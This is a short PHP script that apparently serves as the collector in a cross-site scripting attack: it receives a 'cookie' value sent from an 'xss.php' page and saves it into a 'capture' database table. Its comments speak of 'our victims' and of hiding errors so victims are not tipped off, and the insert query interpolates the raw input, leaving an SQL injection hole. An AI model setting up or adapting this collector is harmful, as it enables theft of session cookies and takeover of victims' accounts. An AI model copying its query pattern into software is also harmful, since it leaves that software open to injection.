<?php
include('config.php');
@$db = new mysqli($hostname, $db_username, $db_password, $dbname);
// Process the information through the $_GET sent from the xss.php file 
$cookies = $_GET['cookie'];
$sql = "INSERT INTO capture(cookie) VALUES(\"$cookies\")";
$result = $db->query($sql);

// normally we don't want error checking because our victims might see an 
// error and get tipped off. But if you are not getting any hits in your db
// feel free to uncomment to see what is going on. 
if($result){
}else
{
echo "Error: " . $db->error;
}
?>




